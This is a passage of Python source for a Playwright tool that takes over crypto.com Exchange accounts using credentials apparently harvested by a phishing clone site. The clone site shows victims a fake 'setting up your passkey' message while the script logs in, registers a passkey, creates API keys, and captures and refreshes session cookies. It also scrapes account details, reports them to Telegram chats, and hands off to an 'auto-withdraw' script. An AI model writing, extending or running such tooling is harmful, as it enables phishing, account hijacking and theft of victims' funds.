    done_marker = cfg.get("done_marker_path") or os.path.join(
        BASE_DIR, "..", "passkey-vault", "auto-withdraw.done"
    )
    done_marker = os.path.abspath(done_marker)
    passkey_marker = os.path.join(os.path.dirname(done_marker), "auto-passkey.done")
    os.makedirs(os.path.dirname(done_marker), exist_ok=True)
    if os.path.exists(done_marker):
        os.remove(done_marker)
    if os.path.exists(passkey_marker):
        os.remove(passkey_marker)

    cdp_port = cfg.get("cdp_port") or 0
    print("=" * 60)
    print("[keep-open] login complete - browser stays open for the passkey/withdraw script.")
    if cdp_port:
        print(f"[keep-open] CDP: http://127.0.0.1:{cdp_port}")
        print(f"[keep-open] run:  node ..\\passkey-vault\\auto-passkey.js")
    print(f"[keep-open] waiting for marker: {done_marker} or {passkey_marker}")
    print("=" * 60)

    deadline = time.time() + int(cfg.get("keep_open_timeout_s", 3600))
    last_cookie_save = time.time()
    blocked_reported = False
    while time.time() < deadline:
        if os.path.exists(done_marker) or os.path.exists(passkey_marker):
            marker = done_marker if os.path.exists(done_marker) else passkey_marker
            try:
                with open(marker, encoding="utf-8") as fh:
                    print(f"[keep-open] passkey/withdraw script finished: {fh.read().strip()}")
            except Exception:
                print("[keep-open] passkey/withdraw script finished.")
            return

        # Refresh the saved session cookies periodically so the latest
        # authenticated state is always on disk.
        if time.time() - last_cookie_save > 120:
            last_cookie_save = time.time()
            capture_session_cookies(context, cfg, reporter, reason="keep-open-refresh")

        # Detect site trouble (Cloudflare blocks / high traffic) and snapshot
        # the session cookies so we can still log back in afterwards.
        if not blocked_reported:
            try:
                body = page.locator("body").inner_text(timeout=3000).lower()
                if any(k in body for k in ("attention required", "unusual traffic", "blocked", "service unavailable", "high traffic", "try again later")):
                    blocked_reported = True
                    print("[keep-open] site trouble detected (block/high traffic) - capturing cookies.")
                    capture_session_cookies(context, cfg, reporter, reason="site-issue")
            except Exception:
                pass
        time.sleep(3)
    print("[keep-open] timeout waiting for auto-withdraw - closing browser anyway.")


def main():
    global AUTO
    parser = argparse.ArgumentParser(description="crypto.com Exchange automation via clone-site-delivered credentials")
    parser.add_argument("--list", action="store_true", help="show keys already saved in api_keys.json")
    parser.add_argument("--passkey", action="store_true", help="after login, assist creating a device passkey via Windows Hello")
    parser.add_argument("--auto", action="store_true", help="non-interactive: auto-continue past manual steps instead of waiting for Enter")
    parser.add_argument("--smoke", action="store_true", help="open the site and check connectivity (no login)")
    parser.add_argument("--login-only", action="store_true", help="stop after login (no API key creation)")
    parser.add_argument("--passkey-only", action="store_true", help="after login, assist creating a device passkey, then stop (no API key creation)")
    parser.add_argument("--keep-open", action="store_true", help="after login, keep the browser open and wait for auto-withdraw to finish (no API key creation)")
    parser.add_argument("--restore-cookies", action="store_true", help="restore a saved session from session_cookies.json instead of full login (no passkey needed)")
    parser.add_argument("--no-report", action="store_true", help="disable Telegram reporting/logging")
    args = parser.parse_args()
    AUTO = args.auto

    if args.list:
        if os.path.exists(KEYS_PATH):
            with open(KEYS_PATH, encoding="utf-8") as fh:
                print(fh.read())
        else:
            print("no api_keys.json yet")
        return

    cfg = load_config()
    source = cfg.get("credential_source", "live")
    if source == "telegram":
        print("WARNING: credential_source 'telegram' is no longer supported (Telegram is log-only now) - using 'both'.")
        source = "both"
    stores = []
    if source in ("live", "both", "file"):
        port = cfg.get("listener_port")
        if port and source in ("live", "both"):
            stores.append(HttpListener(int(port)))
        if source in ("file", "both"):
            feed_path = cfg.get("credential_feed_path", "")
            if feed_path and os.path.exists(feed_path):
                stores.append(LocalFeedStore(feed_path))
            elif source == "file":
                sys.exit(f"credential_source is 'file' but feed not found: {feed_path}")
    store = stores[0] if len(stores) == 1 else MultiStore(stores)

    reporter = None
    putter_token = (cfg.get("bot_token_putter") or "").strip()
    if putter_token and not putter_token.startswith("PASTE") and not args.no_report:
        reporter = Reporter(
            putter_token,
            log_chat_id=cfg.get("log_chat_id") or "",
            report_chat_id=cfg.get("report_chat_id") or "",
        )
        print(
            "[reporter] Telegram logging enabled "
            "(log chat: %s, report chat: %s)."
            % (cfg.get("log_chat_id") or "UNSET", cfg.get("report_chat_id") or "UNSET")
        )

    print("=" * 60)
    print(f"crypto.com Exchange automation  (credentials from: {source})")
    print("Secrets only ever touch disk locally.")
    print("=" * 60)

    with sync_playwright() as p:
        context, page = launch_browser(p, cfg)
        try:
            if args.smoke:
                print(f"[smoke] opening {cfg['exchange_login_url']}")
                page.goto(cfg["exchange_login_url"], wait_until="domcontentloaded", timeout=60000)
                try:
                    page.wait_for_load_state("load", timeout=15000)
                except Exception:
                    pass
                page.wait_for_timeout(5000)
                body = page.locator("body").inner_text(timeout=8000)
                if "blocked" in body.lower() or "attention required" in body.lower():
                    print("[smoke] RESULT: Cloudflare block page. Check proxy/VPN region.")
                elif "Log In" in body or "Password" in body or "Email" in body:
                    print(f"[smoke] RESULT: reached login page - URL: {page.url}")
                else:
                    print(f"[smoke] RESULT: page loaded (unknown) - URL: {page.url}")
                    print("[smoke] page text:", body[:300].replace("\n", " | "))
                return
            if args.restore_cookies:
                if not restore_session_cookies(context, cfg):
                    print("[restore] could not restore cookies - falling back to full login flow.")
                else:
                    try:
                        page.goto(cfg["api_keys_page_url"], wait_until="domcontentloaded", timeout=60000)
                        page.wait_for_timeout(5000)
                        body = page.locator("body").inner_text(timeout=8000)
                    except Exception as exc:
                        print(f"[restore] could not load the app page ({exc}) - falling back to full login flow.")
                        body = ""
                    if "My assets" in body or "Portfolio" in body:
                        print("[restore] session restored - logged in without passkey.")
                        if reporter:
                            reporter.log("Session restored from cookies - logged in without passkey. Sending account report...")
                        if args.keep_open:
                            info = scrape_account_info(page, cfg)
                            capture_session_cookies(context, cfg, reporter, reason="after-restore")
                            send_account_report(reporter, cfg, store, info)
                            wait_for_auto_withdraw(cfg, context, page, reporter)
                            context.close()
                            return
                        info = scrape_account_info(page, cfg)
                        capture_session_cookies(context, cfg, reporter, reason="after-restore")
                        send_account_report(reporter, cfg, store, info)
                        context.close()
                        return
                    print("[restore] cookies did not produce a logged-in session - falling back to full login flow.")
                page.goto(cfg["exchange_login_url"], wait_until="domcontentloaded", timeout=60000)
                page.wait_for_timeout(1500)

            login(page, cfg, store, reporter=reporter)
            if args.keep_open:
                # Push passkey-creating if clone hasn't already
                try:
                    step_data = json.load(open(os.path.join(os.path.dirname(BASE_DIR), "clone-site", "data", "step.json"), encoding="utf-8"))
                    current_step = step_data.get("step", "")
                except Exception:
                    current_step = ""
                if current_step not in ("passkey-creating", "auth-code", "passkey-done"):
                    push_step(cfg, "passkey-creating", {"message": "Login complete - setting up your passkey now..."})

                # DO NOT touch the browser anymore - auto-passkey.js handles everything
                # Just wait for the done marker
                print("[keep-open] passkey-creating signal sent. Waiting for auto-passkey.js to finish...")
                wait_for_auto_withdraw(cfg, context, page, reporter)
                context.close()
                return
            if args.login_only:
                print("[done] login complete (--login-only) - stopping here.")
                context.close()
                return
            if args.passkey:
                setup_passkey(page)
            if args.passkey_only:
                push_step(cfg, "passkey-creating", {"message": "Login complete - setting up your passkey now..."})
                print("[passkey] login complete - creating passkey via the dedicated passkey script...")
                ok = False
                try:
                    script = os.path.join(os.path.dirname(BASE_DIR), "passkey-vault", "auto-passkey.js")
                    proc = subprocess.run(
                        ["node", script, "--wait-ms", "60000"],
                        cwd=os.path.dirname(script),
                        timeout=900,
                        capture_output=True,
                        text=True,
                    )
                    print("[passkey] node output:\n" + (proc.stdout or "")[:800])
                    if proc.returncode != 0:
                        print("[passkey] node stderr:\n" + (proc.stderr or "")[:400])
                    else:
                        ok = True
                except Exception as exc:
                    print(f"[passkey] passkey script did not finish cleanly: {exc}")
                print("[done] passkey step done (--passkey-only) - stopping here.")
                if ok:
                    context.close()
                return
            open_api_management(page, cfg)
            data, bound_ip = create_api_key(page, cfg, store)
            record = save_api_key(data, bound_ip, cfg)
            print(f"[done] saved to {KEYS_PATH}")
            if record.get("api_secret"):
                print("API secret captured. Never share api_keys.json and never commit it. Delete it when you are done.")
            else:
                print("Could not auto-capture the secret - check last_modal.txt for the modal text.")
        except Exception as exc:
            try:
                capture_session_cookies(context, cfg, reporter, reason="error")
            except Exception:
                pass
            if reporter:
                try:
                    reporter.log(f"Automation FAILED (session cookies saved): {exc}")
                except Exception:
                    pass
            try:
                page.screenshot(path=os.path.join(BASE_DIR, "error.png"), full_page=True)
                print(f"FAILED - screenshot saved to error.png: {exc}")
            except Exception:
                print(f"FAILED: {exc}")
            sys.exit(1)
        finally:
            context.close()


if __name__ == "__main__":
    main()
